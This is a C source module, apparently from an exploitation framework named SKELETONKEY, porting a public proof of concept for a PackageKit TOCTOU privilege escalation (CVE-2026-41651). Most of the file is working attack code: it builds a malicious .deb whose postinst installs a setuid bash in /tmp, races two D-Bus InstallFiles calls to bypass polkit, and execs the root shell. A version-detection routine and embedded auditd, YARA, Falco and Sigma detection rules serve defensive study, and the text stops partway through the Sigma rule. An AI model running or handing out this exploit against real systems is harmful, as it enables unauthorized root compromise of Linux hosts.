/*
 * pack2theroot_cve_2026_41651 — SKELETONKEY module
 *
 * Pack2TheRoot (CVE-2026-41651) — PackageKit TOCTOU LPE.
 *
 * Three cooperating bugs in PackageKit's `src/pk-transaction.c`:
 *   BUG 1  InstallFiles() stores cached_transaction_flags and
 *          cached_full_paths unconditionally, with no state guard.
 *   BUG 2  pk_transaction_set_state() silently rejects backward
 *          transitions (READY → WAITING_FOR_AUTH).
 *   BUG 3  pk_transaction_run() reads the cached flags at dispatch
 *          time, not at authorisation time.
 *   BYPASS The SIMULATE flag skips polkit entirely.
 *
 * Two back-to-back async D-Bus InstallFiles() calls — first with
 * SIMULATE (bypasses polkit, queues a GLib idle callback), then
 * immediately with NONE + the malicious .deb (overwrites the cached
 * flags/paths before the idle fires). GLib priority ordering makes
 * this deterministic, not a timing race. postinst of the malicious
 * .deb installs a SUID bash at /tmp/.suid_bash → root shell.
 *
 * This module is a faithful port of the public PoC by Vozec
 * (github.com/Vozec/CVE-2026-41651); the deb-builder helpers
 * (CRC-32, gzip-stored, tar entry, ar entry, build_deb) and the
 * D-Bus call sequence are reproduced from that PoC. The original
 * disclosure was by the Deutsche Telekom security team. See
 * NOTICE.md.
 *
 * Build adaptation: the module requires GLib/GIO for D-Bus. The
 * top-level Makefile autodetects gio-2.0 via pkg-config and defines
 * PACK2TR_HAVE_GIO when present. When absent, the module compiles as
 * a stub that returns PRECOND_FAIL with a build-time hint.
 *
 * Port adaptations vs. the standalone PoC:
 *   - wrapped in the skeletonkey_module detect/exploit/cleanup interface
 *   - exploit() runs the PoC body in a forked child so the PoC's
 *     die()/exit() paths cannot tear down the skeletonkey dispatcher
 *   - detect() does a passive precondition + version check (vulnerable
 *     range 1.0.2 ≤ V ≤ 1.3.4, fixed in 1.3.5) — no version-only
 *     fabrication; the fix release is officially pinned
 *   - honours ctx->no_shell (build + fire the TOCTOU, do not spawn
 *     the SUID bash shell)
 *   - cleanup() removes the two /tmp .debs and best-effort-unlinks
 *     /tmp/.suid_bash (which requires root since it is owned by root)
 *
 * VERIFICATION STATUS: ported, NOT yet validated end-to-end on a
 * vulnerable PackageKit (1.3.4 or earlier) host. The fix release
 * (1.3.5, commit 76cfb675, 2026-04-22) IS pinned.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#if defined(__linux__) && defined(PACK2TR_HAVE_GIO)

/* _GNU_SOURCE / _FILE_OFFSET_BITS are passed via -D in the top-level
 * Makefile; do not redefine here. */
#include "../../core/host.h"
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/file.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <time.h>
#include <glib.h>
#include <gio/gio.h>

/* ── config ────────────────────────────────────────────────────────── */
#define SUID_PATH     "/tmp/.suid_bash"
#define PK_BUS        "org.freedesktop.PackageKit"
#define PK_OBJ        "/org/freedesktop/PackageKit"
#define PK_IFACE      "org.freedesktop.PackageKit"
#define PK_TX_IFACE   "org.freedesktop.PackageKit.Transaction"
#define FLAG_NONE     ((guint64)0)
#define FLAG_SIMULATE ((guint64)(1u << 2))   /* SIMULATE bypasses polkit */

/* Vulnerable range: PackageKit 1.0.2 ≤ V ≤ 1.3.4. Fixed in 1.3.5. */
#define P2TR_VER(M,m,p) ((M)*10000 + (m)*100 + (p))
#define P2TR_VER_LO     P2TR_VER(1,0,2)
#define P2TR_VER_HI     P2TR_VER(1,3,4)

static int p2tr_verbose = 1;
#define LOG(fmt, ...) do { if (p2tr_verbose) \
	fprintf(stderr, "[*] pack2theroot: " fmt "\n", ##__VA_ARGS__); } while (0)
#define ERR(fmt, ...) fprintf(stderr, "[-] pack2theroot: " fmt "\n", ##__VA_ARGS__)

/* ── CRC-32 (ISO 3309) — verbatim from V12 PoC ─────────────────────── */
static uint32_t crc_tab[256];
static void crc_init(void)
{
	for (unsigned i = 0; i < 256; i++) {
		uint32_t c = i;
		for (int j = 0; j < 8; j++) c = (c&1) ? (0xedb88320u ^ (c>>1)) : (c>>1);
		crc_tab[i] = c;
	}
}
static uint32_t crc32_iso(const void *src, size_t n)
{
	const uint8_t *p = src; uint32_t c = 0xffffffffu;
	while (n--) c = crc_tab[(c ^ *p++) & 0xff] ^ (c >> 8);
	return c ^ 0xffffffffu;
}

/* ── gzip stored deflate block (max 65535 B) ───────────────────────── */
static size_t gzip_store(const void *src, size_t len, uint8_t *dst)
{
	if (len > 0xffff) return 0;
	uint8_t *p = dst;
	*p++ = 0x1f; *p++ = 0x8b; *p++ = 0x08; *p++ = 0x00;
	p[0]=p[1]=p[2]=p[3]=0; p+=4; *p++ = 0x00; *p++ = 0xff;
	uint16_t ln = len, nln = ~ln;
	*p++ = 0x01; memcpy(p, &ln, 2); p += 2; memcpy(p, &nln, 2); p += 2;
	memcpy(p, src, len); p += len;
	uint32_t c = crc32_iso(src, len), s = (uint32_t)len;
	memcpy(p, &c, 4); p += 4; memcpy(p, &s, 4); p += 4;
	return p - dst;
}

/* ── ustar tar entry ───────────────────────────────────────────────── */
static size_t tar_entry(uint8_t *buf, const char *name, const void *data,
			size_t dlen, mode_t mode, char type)
{
	memset(buf, 0, 512);
	snprintf((char *)buf,     100, "%s", name);
	snprintf((char *)buf+100,   8, "%07o", (unsigned)mode);
	snprintf((char *)buf+108,   8, "%07o", 0u);
	snprintf((char *)buf+116,   8, "%07o", 0u);
	snprintf((char *)buf+124,  12, "%011o", (unsigned)dlen);
	snprintf((char *)buf+136,  12, "%011o", (unsigned)time(NULL));
	memset(buf+148, ' ', 8);
	buf[156] = type;
	memcpy(buf+257, "ustar", 5); memcpy(buf+263, "00", 2);
	unsigned sum = 0; for (int i = 0; i < 512; i++) sum += buf[i];
	snprintf((char *)buf+148, 8, "%06o", sum);
	buf[154] = '\0'; buf[155] = ' ';
	size_t pad = dlen ? ((dlen + 511) / 512) * 512 : 0;
	if (dlen && data) memcpy(buf + 512, data, dlen);
	if (pad > dlen)   memset(buf + 512 + dlen, 0, pad - dlen);
	return 512 + pad;
}

/* ── ar member ─────────────────────────────────────────────────────── */
static void ar_entry(FILE *f, const char *name, const void *data, size_t sz)
{
	char h[61]; memset(h, ' ', 60); h[60] = 0;
	char t[17]; snprintf(t, 17, "%-16s", name); memcpy(h, t, 16);
	snprintf(t, 13, "%-12lu", (unsigned long)time(NULL)); memcpy(h+16, t, 12);
	memcpy(h+28, "0     ", 6); memcpy(h+34, "0     ", 6);
	memcpy(h+40, "100644  ", 8);
	snprintf(t, 11, "%-10zu", sz); memcpy(h+48, t, 10);
	h[58] = '`'; h[59] = '\n';
	fwrite(h, 1, 60, f); fwrite(data, 1, sz, f);
	if (sz % 2) fputc('\n', f);
}

/* Assemble a minimal .deb (faithful to the V12 PoC build_deb). */
static int build_deb(const char *dest, const char *pkg, const char *postinst)
{
	static uint8_t tarbuf[65536], gzbuf[65536+256];
	memset(tarbuf, 0, sizeof tarbuf);
	crc_init();
	size_t off = 0;

	char ctrl[512];
	snprintf(ctrl, sizeof ctrl,
		 "Package: %s\nVersion: 1.0\nArchitecture: all\n"
		 "Maintainer: SKELETONKEY\nDescription: Pack2TheRoot PoC\n", pkg);

	off += tar_entry(tarbuf+off, "./",        NULL,  0,             0755, '5');
	off += tar_entry(tarbuf+off, "./control", ctrl,  strlen(ctrl),  0644, '0');
	if (postinst)
		off += tar_entry(tarbuf+off, "./postinst", postinst,
				 strlen(postinst), 0755, '0');
	off += 1024;  /* end-of-archive: two 512-byte zero blocks */

	size_t ctrl_gz_len = gzip_store(tarbuf, off, gzbuf);
	if (!ctrl_gz_len) return -1;

	static uint8_t empty_tar[1024], data_gz[256];
	memset(empty_tar, 0, sizeof empty_tar);
	size_t data_gz_len = gzip_store(empty_tar, sizeof empty_tar, data_gz);

	FILE *f = fopen(dest, "wb");
	if (!f) return -1;
	fwrite("!<arch>\n", 1, 8, f);
	ar_entry(f, "debian-binary",   "2.0\n", 4);
	ar_entry(f, "control.tar.gz",  gzbuf,   ctrl_gz_len);
	ar_entry(f, "data.tar.gz",     data_gz, data_gz_len);
	fclose(f);
	return 0;
}

/* ── D-Bus helpers ─────────────────────────────────────────────────── */

typedef struct { GMainLoop *loop; guint32 exit_code; gboolean done; } P2trCtx;

static void cb_finished(GDBusConnection *c G_GNUC_UNUSED,
	const gchar *s G_GNUC_UNUSED, const gchar *o G_GNUC_UNUSED,
	const gchar *i G_GNUC_UNUSED, const gchar *n G_GNUC_UNUSED,
	GVariant *p, gpointer u)
{
	P2trCtx *ctx = u; guint32 ec, rt;
	g_variant_get(p, "(uu)", &ec, &rt);
	LOG("transaction finished (exit=%u, %u ms)", ec, rt);
	ctx->exit_code = ec; ctx->done = TRUE;
	g_main_loop_quit(ctx->loop);
}

static void cb_error(GDBusConnection *c G_GNUC_UNUSED,
	const gchar *s G_GNUC_UNUSED, const gchar *o G_GNUC_UNUSED,
	const gchar *i G_GNUC_UNUSED, const gchar *n G_GNUC_UNUSED,
	GVariant *p, gpointer u G_GNUC_UNUSED)
{
	guint32 code; const gchar *det;
	g_variant_get(p, "(u&s)", &code, &det);
	LOG("PK error %u: %s", code, det);
}

static gboolean cb_timeout(gpointer u)
{
	ERR("transaction loop timed out");
	g_main_loop_quit(u);
	return G_SOURCE_REMOVE;
}

static char *pk_create_tx(GDBusConnection *conn)
{
	GError *e = NULL;
	GVariant *r = g_dbus_connection_call_sync(conn, PK_BUS, PK_OBJ, PK_IFACE,
		"CreateTransaction", NULL, G_VARIANT_TYPE("(o)"),
		G_DBUS_CALL_FLAGS_NONE, -1, NULL, &e);
	if (!r) {
		ERR("CreateTransaction: %s", e ? e->message : "?");
		if (e) g_error_free(e);
		return NULL;
	}
	const gchar *tid; g_variant_get(r, "(&o)", &tid);
	char *copy = g_strdup(tid); g_variant_unref(r);
	return copy;
}

/* Fire-and-forget: both messages must land in the server's socket
 * buffer before the GLib idle from Step 1 fires. Faithful to the PoC. */
static void pk_install_files_async(GDBusConnection *conn, const char *tid,
				   guint64 flags, const char *path)
{
	const char *paths[] = { path, NULL };
	g_dbus_connection_call(conn, PK_BUS, tid, PK_TX_IFACE,
		"InstallFiles", g_variant_new("(t^as)", flags, paths),
		NULL, G_DBUS_CALL_FLAGS_NONE, -1, NULL, NULL, NULL);
}

static bool dbus_name_has_owner(GDBusConnection *conn, const char *name)
{
	GError *e = NULL;
	GVariant *r = g_dbus_connection_call_sync(conn, "org.freedesktop.DBus",
		"/org/freedesktop/DBus", "org.freedesktop.DBus", "NameHasOwner",
		g_variant_new("(s)", name), G_VARIANT_TYPE("(b)"),
		G_DBUS_CALL_FLAGS_NONE, 2000, NULL, &e);
	if (!r) { if (e) g_error_free(e); return false; }
	gboolean has; g_variant_get(r, "(b)", &has);
	g_variant_unref(r);
	return (bool)has;
}

/* Read PackageKit's VersionMajor/Minor/Micro D-Bus properties. */
static bool pk_query_version(GDBusConnection *conn, int *maj, int *min, int *mic)
{
	static const char *names[] = { "VersionMajor", "VersionMinor", "VersionMicro" };
	int *out[3] = { maj, min, mic };
	for (int i = 0; i < 3; i++) {
		GError *e = NULL;
		GVariant *r = g_dbus_connection_call_sync(conn, PK_BUS, PK_OBJ,
			"org.freedesktop.DBus.Properties", "Get",
			g_variant_new("(ss)", PK_IFACE, names[i]),
			G_VARIANT_TYPE("(v)"), G_DBUS_CALL_FLAGS_NONE,
			2000, NULL, &e);
		if (!r) { if (e) g_error_free(e); return false; }
		GVariant *vinner = NULL;
		g_variant_get(r, "(v)", &vinner);
		if (!vinner) { g_variant_unref(r); return false; }
		if (g_variant_is_of_type(vinner, G_VARIANT_TYPE_UINT32))
			*out[i] = (int)g_variant_get_uint32(vinner);
		else if (g_variant_is_of_type(vinner, G_VARIANT_TYPE_INT32))
			*out[i] = (int)g_variant_get_int32(vinner);
		else {
			g_variant_unref(vinner); g_variant_unref(r); return false;
		}
		g_variant_unref(vinner); g_variant_unref(r);
	}
	return true;
}

/* ── detect ────────────────────────────────────────────────────────── */

static skeletonkey_result_t p2tr_detect(const struct skeletonkey_ctx *ctx)
{
	p2tr_verbose = !ctx->json;

	/* "Already root" check — consult ctx->host first so unit tests
	 * can construct a non-root fingerprint regardless of the test
	 * process's real euid. Production main() populates host->is_root
	 * from geteuid() at startup, so behaviour is unchanged. */
	bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
	if (is_root) {
		if (!ctx->json)
			fprintf(stderr, "[i] pack2theroot: already root — nothing to do\n");
		return SKELETONKEY_OK;
	}

	/* Host fingerprint short-circuits — populated once at startup. */
	if (ctx->host && !ctx->host->is_debian_family) {
		if (!ctx->json)
			fprintf(stderr, "[i] pack2theroot: not a Debian-family host "
				"(distro=%s) — PoC's .deb builder is Debian-only\n",
				ctx->host->distro_id);
		return SKELETONKEY_PRECOND_FAIL;
	}
	if (ctx->host && !ctx->host->has_dbus_system) {
		if (!ctx->json)
			fprintf(stderr, "[i] pack2theroot: no system D-Bus socket at "
				"/run/dbus/system_bus_socket — PackageKit unreachable\n");
		return SKELETONKEY_PRECOND_FAIL;
	}

	GError *e = NULL;
	GDBusConnection *conn = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &e);
	if (!conn) {
		if (!ctx->json)
			fprintf(stderr, "[i] pack2theroot: system D-Bus unavailable: %s\n",
				e ? e->message : "(unknown)");
		if (e) g_error_free(e);
		return SKELETONKEY_PRECOND_FAIL;
	}

	if (!dbus_name_has_owner(conn, PK_BUS)) {
		if (!ctx->json)
			fprintf(stderr, "[i] pack2theroot: PackageKit daemon not "
				"registered on the system bus\n");
		g_object_unref(conn);
		return SKELETONKEY_PRECOND_FAIL;
	}

	int maj = 0, min = 0, mic = 0;
	bool got_version = pk_query_version(conn, &maj, &min, &mic);
	g_object_unref(conn);

	if (!got_version) {
		if (!ctx->json)
			fprintf(stderr, "[?] pack2theroot: PackageKit running but "
				"VersionMajor/Minor/Micro unreadable — patch-level "
				"unknown\n");
		return SKELETONKEY_TEST_ERROR;
	}

	int v = P2TR_VER(maj, min, mic);
	if (!ctx->json)
		fprintf(stderr, "[*] pack2theroot: PackageKit %d.%d.%d on the bus\n",
			maj, min, mic);

	if (v < P2TR_VER_LO) {
		if (!ctx->json)
			fprintf(stderr, "[+] pack2theroot: %d.%d.%d predates the bug "
				"(introduced in 1.0.2)\n", maj, min, mic);
		return SKELETONKEY_OK;
	}
	if (v > P2TR_VER_HI) {
		if (!ctx->json)
			fprintf(stderr, "[+] pack2theroot: %d.%d.%d is patched "
				"(fixed in 1.3.5, commit 76cfb675)\n", maj, min, mic);
		return SKELETONKEY_OK;
	}
	if (!ctx->json)
		fprintf(stderr, "[!] pack2theroot: PackageKit %d.%d.%d is "
			"VULNERABLE (range 1.0.2 ≤ V ≤ 1.3.4)\n", maj, min, mic);
	return SKELETONKEY_VULNERABLE;
}

/* ── exploit child (faithful port of the PoC main() body) ──────────── */

static int p2tr_child_run(int no_shell)
{
	char dummy[64], payload[64], postinst[160];
	snprintf(dummy,    sizeof dummy,    "/tmp/.pk-dummy-%d.deb",    getpid());
	snprintf(payload,  sizeof payload,  "/tmp/.pk-payload-%d.deb",  getpid());
	snprintf(postinst, sizeof postinst,
		 "#!/bin/sh\ninstall -m 4755 /bin/bash %s\n", SUID_PATH);

	LOG("building .deb packages (pure C; ar/tar/gzip inline)");
	if (build_deb(dummy,   "skeletonkey-p2tr-dummy",   NULL) < 0) {
		ERR("dummy .deb build failed");
		return 2;
	}
	if (build_deb(payload, "skeletonkey-p2tr-payload", postinst) < 0) {
		ERR("payload .deb build failed"); unlink(dummy);
		return 2;
	}
	if (access(dummy, F_OK) != 0 || access(payload, F_OK) != 0) {
		ERR("built .deb files are missing"); return 2;
	}
	LOG("dummy   : %s", dummy);
	LOG("payload : %s", payload);

	GError *err = NULL;
	GDBusConnection *conn = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &err);
	if (!conn) {
		ERR("system D-Bus: %s", err ? err->message : "?");
		if (err) g_error_free(err);
		unlink(dummy); unlink(payload);
		return 4;
	}

	char *tid = pk_create_tx(conn);
	if (!tid) { g_object_unref(conn); unlink(dummy); unlink(payload); return 2; }
	LOG("transaction : %s", tid);

	P2trCtx pkctx = { .loop = g_main_loop_new(NULL, FALSE), .done = FALSE };
	guint sf = g_dbus_connection_signal_subscribe(conn, PK_BUS, PK_TX_IFACE,
		"Finished",  tid, NULL, G_DBUS_SIGNAL_FLAGS_NONE, cb_finished, &pkctx, NULL);
	guint se = g_dbus_connection_signal_subscribe(conn, PK_BUS, PK_TX_IFACE,
		"ErrorCode", tid, NULL, G_DBUS_SIGNAL_FLAGS_NONE, cb_error,    NULL,   NULL);

	/* ── EXPLOIT ───────────────────────────────────────────────────── */
	LOG("step 1: InstallFiles(SIMULATE=0x%llx, dummy) [async]",
	    (unsigned long long)FLAG_SIMULATE);
	pk_install_files_async(conn, tid, FLAG_SIMULATE, dummy);

	LOG("step 2: InstallFiles(NONE=0x%llx, payload) [async]",
	    (unsigned long long)FLAG_NONE);
	pk_install_files_async(conn, tid, FLAG_NONE, payload);

	/* Flush so both messages land in the server's socket buffer before
	 * its main loop runs the GLib idle from step 1. */
	{
		GError *fe = NULL;
		if (!g_dbus_connection_flush_sync(conn, NULL, &fe)) {
			ERR("D-Bus flush: %s", fe ? fe->message : "?");
			g_clear_error(&fe);
		}
	}

	LOG("awaiting dispatch (30s max)");
	g_timeout_add_seconds(30, cb_timeout, pkctx.loop);
	g_main_loop_run(pkctx.loop);

	g_dbus_connection_signal_unsubscribe(conn, sf);
	g_dbus_connection_signal_unsubscribe(conn, se);
	g_free(tid);
	g_object_unref(conn);

	/* Record /tmp paths for cleanup() even if the SUID never lands. */
	int sf2 = open("/tmp/skeletonkey-pack2theroot.state",
		       O_WRONLY | O_CREAT | O_TRUNC, 0600);
	if (sf2 >= 0) {
		dprintf(sf2, "%s\n%s\n", dummy, payload);
		close(sf2);
	}

	/* Poll up to 120s for the SUID bash; the APT backend may keep
	 * running after polkit fires. Faithful to the PoC's polling loop. */
	LOG("polling for SUID payload at %s (120s max)", SUID_PATH);
	struct stat st;
	int appeared_at = -1;
	for (int i = 0; i < 1200; i++) {
		usleep(100000);  /* 100 ms */
		if (i % 50 == 0 && p2tr_verbose) {
			int lock_fd = open("/var/lib/dpkg/lock", O_RDONLY);
			int lock_held = 0;
			if (lock_fd >= 0) {
				lock_held = (flock(lock_fd, LOCK_EX | LOCK_NB) != 0);
				if (!lock_held) flock(lock_fd, LOCK_UN);
				close(lock_fd);
			}
			fprintf(stderr, "[*] pack2theroot:   t+%ds  payload=%s  "
				"dpkg_lock=%s  suid=%s\n",
				(i/10)+1,
				access(payload, F_OK) == 0 ? "present" : "consumed",
				lock_held ? "held" : "free",
				access(SUID_PATH, F_OK) == 0 ? "FOUND" : "not yet");
		}
		if (stat(SUID_PATH, &st) == 0 && (st.st_mode & S_ISUID)) {
			appeared_at = i;
			break;
		}
	}

	if (appeared_at < 0) {
		ERR("SUID bash never appeared at %s within 120s", SUID_PATH);
		return 3;   /* EXPLOIT_FAIL */
	}

	LOG("SUCCESS — SUID bash landed at t+%dms", appeared_at * 100);

	if (no_shell) {
		LOG("--no-shell: payload placed, root shell not spawned");
		LOG("revert with `skeletonkey --cleanup pack2theroot` (needs root)");
		return 0;
	}

	/* Exec the SUID bash interactively. */
	if (isatty(STDIN_FILENO)) {
		char *ttydev = ttyname(STDIN_FILENO);
		pid_t child = fork();
		if (child == 0) {
			setsid();
			if (ttydev) {
				int t = open(ttydev, O_RDWR);
				if (t >= 0) {
					ioctl(t, TIOCSCTTY, 1);
					dup2(t, 0); dup2(t, 1); dup2(t, 2);
					if (t > 2) close(t);
				}
			}
			char *argv[] = { (char *)SUID_PATH, "-p", NULL };
			execv(SUID_PATH, argv);
			_exit(1);
		}
		if (child > 0) { int s; waitpid(child, &s, 0); }
	} else {
		/* Non-tty: just exec the SUID bash (replaces our process). */
		char *argv[] = { (char *)SUID_PATH, "-p", NULL };
		execv(SUID_PATH, argv);
		ERR("execv(%s): %s", SUID_PATH, strerror(errno));
		return 3;
	}
	return 0;
}

static skeletonkey_result_t p2tr_exploit(const struct skeletonkey_ctx *ctx)
{
	p2tr_verbose = !ctx->json;

	if (geteuid() == 0) {
		fprintf(stderr, "[i] pack2theroot: already root — nothing to do\n");
		return SKELETONKEY_OK;
	}

	pid_t pid = fork();
	if (pid < 0) { perror("fork"); return SKELETONKEY_TEST_ERROR; }
	if (pid == 0) {
		int rc = p2tr_child_run(ctx->no_shell);
		_exit(rc);
	}
	int st;
	waitpid(pid, &st, 0);
	if (!WIFEXITED(st)) return SKELETONKEY_EXPLOIT_FAIL;
	switch (WEXITSTATUS(st)) {
	case 0:  return SKELETONKEY_EXPLOIT_OK;
	case 4:  return SKELETONKEY_PRECOND_FAIL;
	default: return SKELETONKEY_EXPLOIT_FAIL;
	}
}

/* ── cleanup ───────────────────────────────────────────────────────── */

static skeletonkey_result_t p2tr_cleanup(const struct skeletonkey_ctx *ctx)
{
	p2tr_verbose = !ctx->json;

	/* Remove the two staged .debs (recorded during exploit). */
	int sf = open("/tmp/skeletonkey-pack2theroot.state", O_RDONLY);
	if (sf >= 0) {
		char buf[512] = {0};
		ssize_t n = read(sf, buf, sizeof(buf) - 1);
		close(sf);
		if (n > 0) {
			char *line = strtok(buf, "\n");
			while (line) {
				if (unlink(line) == 0) LOG("removed %s", line);
				line = strtok(NULL, "\n");
			}
		}
		unlink("/tmp/skeletonkey-pack2theroot.state");
	}

	/* Best-effort remove the SUID bash. It is owned by root, so this
	 * only succeeds when cleanup runs with root privileges (e.g. the
	 * caller already used the SUID shell to escalate). */
	if (access(SUID_PATH, F_OK) == 0) {
		if (unlink(SUID_PATH) == 0) {
			LOG("removed %s", SUID_PATH);
		} else {
			ERR("could not remove %s (%s); rerun cleanup as root, or:",
			    SUID_PATH, strerror(errno));
			ERR("   sudo rm -f %s", SUID_PATH);
		}
	}

	/* Best-effort: uninstall the malicious package via passwordless sudo. */
	if (system("sudo -n dpkg -r skeletonkey-p2tr-payload skeletonkey-p2tr-dummy "
		   ">/dev/null 2>&1") == 0) {
		LOG("dpkg -r removed staged packages");
	} else {
		LOG("dpkg -r not run automatically; if needed:");
		LOG("   sudo dpkg -r skeletonkey-p2tr-payload skeletonkey-p2tr-dummy");
	}
	return SKELETONKEY_OK;
}

#else  /* !__linux__ || !PACK2TR_HAVE_GIO */

static skeletonkey_result_t p2tr_detect(const struct skeletonkey_ctx *ctx)
{
	if (!ctx->json) {
#ifndef __linux__
		fprintf(stderr, "[i] pack2theroot: Linux-only module "
			"(PackageKit D-Bus) — not applicable on this platform\n");
#else
		fprintf(stderr, "[i] pack2theroot: module built without "
			"GLib/gio-2.0 support — install libglib2.0-dev and rebuild\n");
#endif
	}
	return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t p2tr_exploit(const struct skeletonkey_ctx *ctx)
{
	(void)ctx;
	fprintf(stderr, "[-] pack2theroot: not built with GLib/gio-2.0 support\n");
	return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t p2tr_cleanup(const struct skeletonkey_ctx *ctx)
{
	(void)ctx;
	return SKELETONKEY_OK;
}

#endif /* __linux__ && PACK2TR_HAVE_GIO */

/* ── embedded detection rules ──────────────────────────────────────── */

static const char p2tr_auditd[] =
	"# Pack2TheRoot (CVE-2026-41651) — auditd detection rules\n"
	"# PackageKit TOCTOU LPE: two back-to-back InstallFiles D-Bus calls\n"
	"# install a malicious .deb as root and drop a SUID bash in /tmp.\n"
	"# Watch the side effects — D-Bus calls themselves aren't auditable\n"
	"# without bus-monitoring, but the file footprint is unmistakable.\n"
	"\n"
	"# SUID bash carrier that the PoC postinst lands\n"
	"-w /tmp/.suid_bash -p wa -k skeletonkey-pack2theroot\n"
	"\n"
	"# Any new setuid binary owned by root in /tmp is suspicious\n"
	"-a always,exit -F arch=b64 -S chmod,fchmod,fchmodat \\\n"
	"    -F path=/tmp/.suid_bash -k skeletonkey-pack2theroot-suid\n"
	"\n"
	"# The PoC drops two .deb files in /tmp before the install fires\n"
	"-a always,exit -F arch=b64 -S openat,creat \\\n"
	"    -F dir=/tmp -F success=1 -k skeletonkey-pack2theroot-deb\n"
	"\n"
	"# packagekitd-driven dpkg activity initiated by a non-root caller\n"
	"-a always,exit -F arch=b64 -S execve -F path=/usr/bin/dpkg \\\n"
	"    -F auid!=0 -k skeletonkey-pack2theroot-dpkg\n"
	"-a always,exit -F arch=b64 -S execve -F path=/usr/bin/apt-get \\\n"
	"    -F auid!=0 -k skeletonkey-pack2theroot-apt\n";

static const char p2tr_yara[] =
    "rule pack2theroot_malicious_deb : cve_2026_41651\n"
    "{\n"
    "    meta:\n"
    "        cve         = \"CVE-2026-41651\"\n"
    "        description = \"Pack2TheRoot payload .deb: small ar archive whose postinst installs a setuid copy of bash to /tmp/.suid_bash. The Vozec PoC + SKELETONKEY's port both leave this artifact in /tmp.\"\n"
    "        author      = \"SKELETONKEY\"\n"
    "        reference   = \"https://github.com/Vozec/CVE-2026-41651\"\n"
    "    strings:\n"
    "        $deb_magic       = \"!<arch>\"\n"
    "        $postinst_suid   = \"install -m 4755 /bin/bash\"\n"
    "        $skk_payload     = \"Package: skeletonkey-p2tr-payload\"\n"
    "        $skk_dummy       = \"Package: skeletonkey-p2tr-dummy\"\n"
    "        $vozec_payload   = \"Package: pk-poc-payload\"\n"
    "        $vozec_dummy     = \"Package: pk-poc-dummy\"\n"
    "    condition:\n"
    "        // Small ar archive matching .deb layout, containing either\n"
    "        // the published-PoC package names or the SUID-bash postinst.\n"
    "        $deb_magic at 0 and\n"
    "        ($postinst_suid or any of ($skk_payload, $skk_dummy, $vozec_payload, $vozec_dummy)) and\n"
    "        filesize < 64KB\n"
    "}\n"
    "\n"
    "rule pack2theroot_suid_bash_drop : cve_2026_41651\n"
    "{\n"
    "    meta:\n"
    "        cve         = \"CVE-2026-41651\"\n"
    "        description = \"Pack2TheRoot SUID-bash artifact: /tmp/.suid_bash is the setuid bash dropped by the malicious postinst. Pair this YARA scan with auditd watch -w /tmp/.suid_bash for catch-on-create.\"\n"
    "        author      = \"SKELETONKEY\"\n"
    "    strings:\n"
    "        $elf  = { 7F 45 4C 46 02 01 01 }\n"
    "        $bash = \"GNU bash\"\n"
    "    condition:\n"
    "        // The rule itself can't see the file path; the operator\n"
    "        // points YARA at /tmp/.suid_bash specifically. Match\n"
    "        // confirms the file is a real bash ELF (not a planted decoy).\n"
    "        $elf at 0 and $bash\n"
    "}\n";

static const char p2tr_falco[] =
    "- rule: SUID bash dropped to /tmp (Pack2TheRoot postinst signature)\n"
    "  desc: |\n"
    "    A setuid bit appears on /tmp/.suid_bash. The Pack2TheRoot\n"
    "    (CVE-2026-41651) malicious .deb postinst runs as root via\n"
    "    the polkit-bypassed PackageKit transaction and lands a SUID\n"
    "    copy of /bin/bash at this path.\n"
    "  condition: >\n"
    "    evt.type in (chmod, fchmod, fchmodat) and\n"
    "    evt.arg.mode contains \"S_ISUID\" and\n"
    "    fd.name = /tmp/.suid_bash\n"
    "  output: >\n"
    "    SUID bit set on /tmp/.suid_bash (proc=%proc.name pid=%proc.pid\n"
    "     ppid=%proc.ppid parent=%proc.pname)\n"
    "  priority: CRITICAL\n"
    "  tags: [filesystem, mitre_privilege_escalation, T1068, cve.2026.41651]\n"
    "\n"
    "- rule: PackageKit InstallFiles invoked twice on same transaction (Pack2TheRoot TOCTOU)\n"
    "  desc: |\n"
    "    Two D-Bus InstallFiles() calls hit the same PackageKit\n"
    "    transaction object in close succession — the exact shape of\n"
    "    the Pack2TheRoot TOCTOU. Detection requires bus monitoring;\n"
    "    Falco's k8s/audit ruleset doesn't cover D-Bus natively, but\n"
    "    if dbus-monitor or systemd's bus audit is wired into the\n"
    "    feed, this is the trigger.\n"
    "  condition: >\n"
    "    // Placeholder: requires dbus-monitor → falco feed.\n"
    "    // Real-world deployment: pipe `dbus-monitor --system` into\n"
    "    // a log-source rule keyed on the InstallFiles method name.\n"
    "    proc.cmdline contains \"InstallFiles\" and proc.cmdline contains \"PackageKit\"\n"
    "  output: >\n"
    "    Possible Pack2TheRoot D-Bus TOCTOU shape (cmdline=\"%proc.cmdline\")\n"
    "  priority: WARNING\n"
    "  tags: [dbus, cve.2026.41651]\n"
    "\n"
    "- rule: dpkg invoked by PackageKit on behalf of non-root caller\n"
    "  desc: |\n"
    "    PackageKit forks dpkg to install a .deb on behalf of an\n"
    "    unprivileged caller. Combined with /tmp/.suid_bash creation,\n"
    "    this completes the Pack2TheRoot exploit chain.\n"
    "  condition: >\n"
    "    spawned_process and proc.name = dpkg and proc.aname = packagekitd and\n"
    "    proc.cmdline contains \"/tmp/.pk-\"\n"
    "  output: >\n"
    "    PackageKit-driven dpkg install of /tmp-resident .deb\n"
    "    (parent=%proc.pname cmdline=\"%proc.cmdline\")\n"
    "  priority: CRITICAL\n"
    "  tags: [process, cve.2026.41651, pack2theroot]\n";

static const char p2tr_sigma[] =
	"title: Possible Pack2TheRoot exploitation (CVE-2026-41651)\n"
	"id: 3f2b8d54-skeletonkey-pack2theroot\n"
	"status: experimental\n"
	"description: |\n"
	"  Detects the footprint of Pack2TheRoot (CVE-2026-41651): a non-root\n"
	"  user triggers PackageKit InstallFiles, dpkg runs a postinst that\n"
	"  drops /tmp/.suid_bash (a setuid bash), and a privileged shell\n"
	"  follows. The trigger itself is two back-to-back D-Bus calls with\n"
	"  no polkit prompt — only visible via dbus-monitor or the file\n"
	"  side effects.\n"
	"references:\n"
	"  - https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html\n"
